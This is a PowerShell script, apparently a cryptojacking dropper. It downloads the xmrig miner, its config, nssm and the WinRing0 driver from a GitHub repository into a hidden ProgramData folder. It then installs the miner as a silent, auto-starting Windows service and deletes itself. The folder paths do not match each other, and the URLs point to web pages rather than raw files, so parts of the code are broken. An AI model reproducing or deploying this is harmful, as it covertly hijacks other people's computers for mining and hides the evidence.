# Check and return current user name
$currentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\')[1]

# Paths
$dircheck = "C:\ProgramData\.diagnostic.txt\"
$filcheck = "C:\Users\$currentUserName\xmrig.exe"

# Removal functions
if (Test-Path $dircheck) {
    Remove-Item -Recurse -Force $dircheck
}
if (Test-Path $filcheck) {
    Remove-Item -Force $filcheck
}

# Download files
$urls = @(
    'https://github.com/User07x07/Dopple/blob/main/config.json',
    'https://github.com/User07x07/Dopple/blob/main/xmrig.exe',
    'https://github.com/User07x07/Dopple/blob/main/nssm.exe',
    'https://github.com/User07x07/Dopple/blob/main/WinRing0x64.sys'
)

foreach ($url in $urls) {
    $filename = $url.Split('/')[-1]
    try {
        Invoke-WebRequest -Uri $url -Headers @{'ngrok-skip-browser-warning'='true'} -OutFile $filename
    } catch {
        Write-Host "Failed to download $filename from $url" -ForegroundColor Red
        Exit
    }
}

# Get thread count (using CPU count as a basic substitute for now)
$threads = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors
$tf = [math]::Round(25 * $threads)

# Move and setup files
if (-not (Test-Path $dircheck)) {
    New-Item -ItemType Directory -Path $dircheck
}
Move-Item xmrig.exe $dircheck
Move-Item config.json $dircheck
Move-Item nssm.exe $dircheck

# Create a NSSM command that will make the xmrig.exe run as a service in the background
Set-Location $dircheck
try {
    .\nssm install xmrig "C:\ProgramData\.logstxt\xmrig.exe"
    .\nssm set xmrig AppDirectory "C:\ProgramData\.logstxt"
    .\nssm set xmrig AppParameters "xmrig.exe -B -c config.json" # -B = run the miner in the background
    .\nssm start xmrig
    .\nssm set xmrig start SERVICE_AUTO_START
    .\nssm set xmrig AppNoConsole 1
    .\nssm set xmrig Type SERVICE_WIN32_OWN_PROCESS
} catch {
    Write-Host "Failed to configure or start the xmrig service" -ForegroundColor Red
    Exit
}

# Clean up

Remove-Item $PSCommandPath -Force
